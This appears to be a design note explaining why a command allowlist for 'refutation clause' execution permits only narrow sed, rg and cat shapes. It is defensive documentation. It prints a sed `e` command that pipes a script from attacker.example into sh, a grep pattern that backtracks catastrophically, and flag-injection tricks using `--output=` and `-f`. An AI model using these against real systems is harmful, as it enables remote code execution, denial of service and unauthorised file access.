# Why the Refutation-Clause Shapes Are That Narrow

The [allowed invocation shapes](./refutation-clause-execution.md) look over-restrictive until you
see what the wider form of each command does. Read this before widening any of them.

## An Allowlist of Verbs Is the Wrong Unit

The first word of a command tells you almost nothing. Real commands carry flags and, in `sed`'s
case, an embedded mini-language, and that is where the execution and write primitives live. Every
example below starts with a verb a reasonable person would call read-only.

## `sed`

GNU `sed` executes a shell through the `e` command and the `s///e` flag, and **both work under
`-n`**. So `sed -n '1e curl https://attacker.example/x | sh' f` matches "starts with `sed -n`" and
runs whatever the attacker serves. This was confirmed empirically rather than reasoned about:
`sed -n '1e echo INJECTED' <file>` prints `INJECTED`.

Only a numeric range plus `p` is safe, which is why the shape is exactly `sed -n '<N>,<M>p'`.

## `rg`, and Why Not `grep`

`rg` is the only search engine on the list, and the reason is cost, not syntax. GNU `grep` matches
by backtracking: `\(a\{1,n\}\)\{1,n\}b` — ordinary BRE, no backreference, no `-P` — took 19
seconds against a 500-byte file and grows roughly cubically. `rg` matches with finite automata, ran
the same pattern in half a second, rejects backreferences at parse time, and refuses an oversized
pattern outright rather than running it.

An engine that bounds its own cost is a guarantee; a list of forbidden constructs is an
enumeration, and enumerations lag — see the [escape ledger](./refutation-clause-escape-ledger.md).

`-f <file>` reads patterns from a path, turning a search into a file read the clause never named.
`-P` enables PCRE backtracking, the behaviour `rg` was chosen to avoid. Neither is on the list, and
neither is `-A`/`-B`/`-C`: context lines answer no question a refutation clause asks, and every one
returns more attacker-authored text into the fixer.

## No Placeholder Begins With `-`

A value beginning with `-` arrives as a flag, and the flag surface is where the primitives live:
`--output=` on a git command created or overwrote an arbitrary path, and `-f` on a search command
redirects it to read a file nobody named. The rule is general because the surface is.

`-r` is off the list for a different reason: it changes what a path _means_. Given a directory,
`grep -r` walks every file underneath, gitignored ones included, so a per-path safety check that
passed on the directory never saw what was actually read. Note `rg` would have hidden this rather
than fixed it — it skips gitignored files by default, so the same clause silently reads less under
one tool than the other, and a safety rule whose effect depends on which binary is installed is
not a rule.

Reads are a separate problem from writes: `cat`, `sed`, `grep`, and `rg` never write, but none of
them consults git either — see [why the path rule is that shape](./refutation-clause-path-rule.md).
